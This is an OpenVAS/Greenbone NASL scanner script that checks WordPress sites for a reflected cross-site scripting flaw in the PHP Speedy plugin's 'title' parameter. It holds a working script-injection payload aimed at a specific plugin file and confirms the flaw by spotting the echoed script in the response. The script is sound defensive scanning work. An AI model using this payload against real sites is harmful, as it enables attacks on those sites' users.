CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802009" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2011-03-16 15:16:52 +0100 (Wed, 16 Mar 2011)" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_name( "WordPress PHP Speedy Plugin 'title' Parameter Cross Site Scripting Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "wordpress/installed" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/43652/" );
	script_tag( name: "impact", value: "Successful exploitation will allow attackers to execute arbitrary
  web script or HTML in a user's browser session in the context of an affected site." );
	script_tag( name: "affected", value: "WordPress PHP Speedy plugin version 0.5.2 and prior." );
	script_tag( name: "insight", value: "The flaw is caused by an input validation error in the 'title'
  parameter in 'wp-content/plugins/php_speedy_wp/libs/php_speedy/view/admin_container.php'
  when processing user-supplied data, which could be exploited by attackers to
  cause arbitrary scripting code to be executed by the user's browser in the
  security context of an affected site." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is installed with WordPress PHP Speedy Plugin and is
  prone to cross-site scripting vulnerability." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = dir + "/wp-content/plugins/php_speedy_wp/libs/php_speedy/view/admin_container.php?title=</title><script>alert(11111)</script>";
if(http_vuln_check( port: port, url: url, pattern: "</title><script>alert\\(11111\\)</script>", check_header: TRUE )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

